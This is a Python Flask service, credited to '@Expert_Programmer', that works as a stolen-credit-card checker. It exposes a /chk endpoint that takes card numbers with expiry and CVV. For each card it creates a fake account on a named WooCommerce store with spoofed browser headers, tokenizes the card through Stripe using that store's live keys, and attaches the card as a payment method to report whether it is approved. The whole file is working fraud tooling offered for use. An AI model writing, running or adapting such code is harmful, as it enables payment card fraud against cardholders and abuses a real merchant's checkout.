from flask import Flask, request, jsonify
import requests, re, random, string, os
app = Flask(__name__)
# Configuration
STRIPE_PUBLIC_KEY = os.getenv('STRIPE_PUBLIC_KEY', 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs')
STRIPE_ACCOUNT = os.getenv('STRIPE_ACCOUNT', 'acct_1Mpulb2El1QixccJ')
class Gate:
    def __init__(self):
        self.s = requests.Session()
        
        # Random User-Agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6; rv:94.0) Gecko/20100101 Firefox/94.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
        ]
        
        self.user_agent = random.choice(user_agents)
        
        self.s.headers.update({
            'user-agent': self.user_agent,
            'authority': 'redbluechair.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://redbluechair.com',
            'referer': 'https://redbluechair.com/my-account/',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
    
    def rnd_str(self, l=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
    
    def register_user(self):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/')
            nonce = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
            if not nonce:
                return False
                
            rnd = self.rnd_str()
            email = f'user{rnd}@gmail.com'
            password = f'Pass{rnd}!!'
            
            data = {
                'email': email,
                'password': password,
                'register': 'Register',
                'woocommerce-register-nonce': nonce.group(1),
                '_wp_http_referer': '/my-account/'
            }
            
            r2 = self.s.post('https://redbluechair.com/my-account/', data=data)
            return "Log out" in r2.text
        except Exception as e:
            print(f"Registration error: {str(e)}")
            return False
    
    def get_card_token(self, cc, mm, yy, cvv):
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent
            }
            
            data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'key': STRIPE_PUBLIC_KEY,
                '_stripe_account': STRIPE_ACCOUNT,
                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                'referrer': 'https://redbluechair.com',
                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
            }
            
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            response.raise_for_status()
            
            return response.json().get('id')
        except requests.exceptions.RequestException as e:
            print(f"Stripe tokenization error: {str(e)}")
            return None
    
    def add_payment_method(self, pm_id):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
            text = r1.text
            
            # Find the appropriate nonce
            nonces = {
                'createSetupIntentNonce': re.search(r'\"createSetupIntentNonce\":\"([^\"]+)\"', text),
                'createAndConfirmSetupIntentNonce': re.search(r'\"createAndConfirmSetupIntentNonce\":\"([^\"]+)\"', text),
                'create_setup_intent_nonce': re.search(r'\"create_setup_intent_nonce\":\"([a-z0-9]+)\"', text)
            }
            
            nonce = None
            for name, match in nonces.items():
                if match:
                    nonce = match.group(1)
                    break
            
            if not nonce:
                return "Error"
            
            headers = self.s.headers.copy()
            headers.update({
                'x-requested-with': 'XMLHttpRequest',
                'referer': 'https://redbluechair.com/my-account/add-payment-method/'
            })
            
            payload = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, pm_id),
                '_ajax_nonce': (None, nonce)
            }
            
            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=headers, files=payload)
            response_json = r2.json()
            
            if response_json.get('success'):
                return "Approved"
            else:
                error_message = response_json.get('data', {}).get('error', {}).get('message', 'Declined')
                return error_message
            
        except Exception as e:
            print(f"Payment method addition error: {str(e)}")
            return "Error"
@app.route('/chk', methods=['GET'])
def check_card():
    try:
        card_info = request.args.get('card')
        if not card_info:
            return jsonify({"error": "No card information provided"}), 400
        
        parts = card_info.strip().split('|')
        if len(parts) < 4:
            return jsonify({"error": "Invalid card format"}), 400
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        gate = Gate()
        
        # Attempt registration
        if not gate.register_user():
            return jsonify({"error": "Failed to register user"}), 500
        
        # Get Stripe token
        pm_id = gate.get_card_token(cc, mm, yy, cvv)
        if not pm_id:
            return jsonify({"error": "Failed to get payment method ID"}), 500
        
        # Add payment method
        result = gate.add_payment_method(pm_id)
        
        if result == "Approved":
            return jsonify({
            "status": "OK ✅",
            "message": result,
            "input": f"{cc}|{mm}|{yy}|{cvv}",
            "API BY": "@Expert_Programmer"
        }), 200
        else:
            return jsonify({
            "status": "OK ✅",
            "message": result,
            "input": f"{cc}|{mm}|{yy}|{cvv}",
            "API BY": "@Expert_Programmer"
        }), 400
            
    except Exception as e:
        print(f"Error processing request: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
